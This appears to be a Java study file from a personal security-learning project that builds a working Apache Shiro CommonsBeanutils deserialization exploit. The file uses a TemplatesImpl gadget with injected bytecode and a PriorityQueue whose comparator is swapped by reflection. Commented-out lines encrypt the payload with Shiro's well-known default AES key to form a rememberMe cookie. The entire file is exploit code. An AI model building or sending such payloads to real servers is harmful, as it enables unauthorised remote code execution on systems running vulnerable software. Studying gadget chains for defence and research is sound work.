package Shiro.CB;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
import org.apache.commons.beanutils.*;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

/**
 * @BelongsProject: study_java
 * @BelongsPackage: Shiro
 * @Author: Clown
 * @CreateTime: 2023-08-07  19:01
 */
public class CBTest {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        Class<? extends TemplatesImpl> aClass = templates.getClass();
        Field name = aClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"aaaa");

        Field bytecodes = aClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E:\\study_java\\test\\Test.class"));
        byte[][] codes = {code};
        bytecodes.set(templates,codes);

        BeanComparator beanComparator = new BeanComparator("outputProperties", new AttrCompare());

        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);

        priorityQueue.add(templates);
        priorityQueue.add(2);

        Class c = PriorityQueue.class;
        Field field = c.getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(priorityQueue,beanComparator);

//        Serliazation(priorityQueue);
        Unserlization();

//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
//        objectOutputStream.writeObject(priorityQueue);
//        System.out.println(byteArrayOutputStream);
//
//        AesCipherService aesCipherService = new AesCipherService();
//        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
//        ByteSource ciphertext = aesCipherService.encrypt(byteArrayOutputStream.toByteArray(), key);
//        System.out.println(ciphertext.toString());

    }
    public static void Serliazation(Object object) throws Exception{
        FileOutputStream fileInputStream = new FileOutputStream("poc1.txt");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileInputStream);
        objectOutputStream.writeObject(object);
        System.out.println("Output");
    }

    public static void Unserlization() throws Exception{
        FileInputStream fileInputStream =new FileInputStream("poc1.txt");
        ObjectInputStream objectInputStream =new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
        System.out.println("Input");
    }
}
